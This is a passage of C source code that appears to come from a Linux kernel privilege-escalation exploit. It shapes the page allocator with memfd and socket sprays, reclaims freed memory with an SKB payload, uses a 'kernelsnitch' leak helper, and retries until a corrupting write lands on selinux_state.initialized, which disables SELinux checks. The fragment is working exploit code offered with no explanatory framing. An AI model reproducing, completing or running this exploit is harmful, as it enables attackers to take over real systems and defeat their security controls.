  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(void) {
  int max_attempts = 12;
  struct timespec t_good;
  clock_gettime(CLOCK_MONOTONIC, &t_good);
  struct timespec deadline = t_good;
  deadline.tv_sec += 240;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page();
    if (base) {
      /* W1 stores this page address, so the word's byte 2 lands on
       * selinux_state.initialized. an even byte there fails every SID lookup */
      if (pselect_custom_write == 1 && pselect_child_node &&
          ((fake_right >> 16) & 1) == 0) {
        pr_warning("page %016zx stores an even byte over "
                   "selinux_state.initialized; taking another\n", (size_t)base);
      } else {
        pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
                ms_since(&t_good));
        return base;
      }
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec >= deadline.tv_sec) {
      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
               max_attempts, ms_since(&t_good));
  }
  return 0;
}
